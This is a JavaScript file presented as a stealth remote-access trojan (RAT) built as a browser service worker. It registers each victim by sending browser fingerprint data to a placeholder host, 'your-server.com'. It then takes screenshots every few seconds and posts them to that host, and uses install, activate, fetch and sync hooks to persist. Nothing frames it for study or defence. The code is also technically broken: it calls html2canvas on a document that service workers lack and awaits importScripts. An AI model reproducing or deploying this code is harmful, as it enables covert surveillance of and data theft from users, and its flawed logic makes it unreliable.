// ==================== STEALTH DISCORD RAT - IMPROVED ====================

let victimId = "unknown";
let intervalId = null;

// Capture screenshot without permission popup using html2canvas
async function captureScreenshot() {
    try {
        // Load html2canvas dynamically (no external dependency)
        if (!self.html2canvas) {
            const script = await importScripts('https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js');
        }

        const canvas = await html2canvas(document.documentElement, {
            scale: 0.7,
            logging: false,
            useCORS: true,
            ignoreElements: (elem) => elem.tagName === 'SCRIPT'
        });

        const base64 = canvas.toDataURL('image/jpeg', 0.65);

        await fetch('https://your-server.com/screenshot', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                victimId: victimId,
                image: base64,
                timestamp: Date.now()
            })
        });
    } catch (e) {
        console.error("[RAT] Capture failed");
    }
}

// Register new victim
async function registerVictim() {
    try {
        const data = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            language: navigator.language,
            referrer: document.referrer || "direct",
            timestamp: Date.now()
        };

        const res = await fetch('https://your-server.com/victim', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });

        const json = await res.json();
        if (json.victimId) {
            victimId = json.victimId;
        }
    } catch (e) {}
}

// Main loop
function startRAT() {
    if (intervalId) clearInterval(intervalId);
    
    intervalId = setInterval(() => {
        captureScreenshot();
    }, 4500); // Screenshot every 4.5 seconds
}

// Keep service worker alive and restart if needed
self.addEventListener('activate', async (event) => {
    event.waitUntil(
        (async () => {
            await self.clients.claim();
            await registerVictim();
            startRAT();
        })()
    );
});

self.addEventListener('install', () => {
    self.skipWaiting();
});

// Periodic wake-up to prevent dying
self.addEventListener('fetch', (event) => {
    event.respondWith(
        (async () => {
            if (!intervalId) startRAT();
            return await fetch(event.request);
        })()
    );
});

// Background sync fallback
self.addEventListener('sync', (event) => {
    if (event.tag === 'rat-sync') {
        startRAT();
    }
});
